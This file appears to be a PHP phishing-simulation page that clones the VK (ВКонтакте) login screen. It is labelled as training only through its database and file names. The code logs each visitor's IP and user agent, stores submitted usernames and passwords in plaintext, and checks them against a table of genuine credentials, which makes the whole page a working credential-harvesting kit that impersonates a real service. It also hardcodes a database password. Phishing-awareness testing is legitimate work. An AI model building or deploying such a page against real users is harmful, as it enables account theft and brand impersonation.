<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

// Генерируем уникальный ID для каждого визита
function generate_visit_id() {
    return uniqid('visit_', true);
}

// Логирование посещения
function log_visit($visit_id) {
    $session_id = session_id();
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // Подключение к БД
    $pdo = new PDO("pgsql:host=localhost;dbname=phishing_training", "trainer", "secure_password");
    
    // Всегда вставляем новую запись с уникальным visit_id
    $stmt = $pdo->prepare("INSERT INTO simulation_results (session_id, visit_id, was_submitted, user_ip, user_agent) VALUES (?, ?, FALSE, ?, ?)");
    $stmt->execute([$session_id, $visit_id, $user_ip, $user_agent]);
    
    return $visit_id;
}

// Обработка формы входа
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $visit_id = $_POST['visit_id'] ?? '';
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (!empty($visit_id)) {
        $pdo = new PDO("pgsql:host=localhost;dbname=phishing_training", "trainer", "secure_password");
        
        // ЛЮБАЯ отправка формы = фишинговая попытка
        $is_phishing_attempt = true;
        
        // Проверка корректности данных через БД
        $is_legitimate = false;
        $check_stmt = $pdo->prepare("SELECT id FROM legitimate_credentials WHERE username = ? AND password = ?");
        $check_stmt->execute([$username, $password]);

        if ($check_stmt->fetch()) {
            $is_legitimate = true;
        }

        $is_legitimate_int = $is_legitimate ? 1 : 0;
        $is_phishing_attempt_int = $is_phishing_attempt ? 1 : 0;
        
        // Обновление записи по visit_id
        $stmt = $pdo->prepare("UPDATE simulation_results SET submitted_data = ?, was_submitted = TRUE, is_legitimate = ?, is_phishing_attempt = ? WHERE visit_id = ?");
        $submitted_data = json_encode(['username' => $username, 'password' => $password]);
        $stmt->execute([$submitted_data, $is_legitimate_int, $is_phishing_attempt_int, $visit_id]);
        
        // Редирект на обучающую страницу
        header("Location: training_completed.php?visit_id=" . urlencode($visit_id));
        exit;
    }
}
// Генерируем новый visit_id для каждого визита
$visit_id = generate_visit_id();
log_visit($visit_id);
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ВКонтакте | Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #4a76a8 0%, #2a5885 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
        }
        
        .vk-header {
            background: #4a76a8;
            padding: 30px 20px;
            text-align: center;
            color: white;
        }
        
        .vk-logo {
            width: 80px;
            height: 80px;
            background: white;
            border-radius: 50%;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            font-weight: bold;
            color: #4a76a8;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        .vk-title {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 5px;
        }
        
        .vk-subtitle {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .login-form {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #4a76a8;
        }
        
        .login-button {
            width: 100%;
            background: #4a76a8;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .login-button:hover {
            background: #3a6698;
        }
        
        .login-footer {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
        }
        
        .footer-links a {
            color: #4a76a8;
            text-decoration: none;
            font-size: 13px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .language-selector {
            margin-top: 15px;
            font-size: 12px;
            color: #777;
        }
        
        /* Адаптивность */
        @media (max-width: 480px) {
            .login-container {
                margin: 10px;
            }
            
            .login-form {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="vk-header">
            <div class="vk-logo">VK</div>
            <div class="vk-title">ВКонтакте</div>
            <div class="vk-subtitle">Вход в социальную сеть</div>
        </div>
        
        <form method="POST" class="login-form">
            <input type="hidden" name="visit_id" value="<?php echo htmlspecialchars($visit_id); ?>">
            
            <div class="form-group">
                <label for="username">Телефон или почта</label>
                <input type="text" id="username" name="username" placeholder="+7 (999) 999-99-99" required>
            </div>
            
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
            </div>
            
            <button type="submit" name="submit" class="login-button">Войти</button>
        </form>
        
        <div class="login-footer">
            <div class="footer-links">
                <a href="#">Зарегистрироваться</a>
                <a href="#">Восстановить пароль</a>
            </div>
            <div class="language-selector">
                Русский · English · Deutsch
            </div>
        </div>
    </div>
</body>
</html>
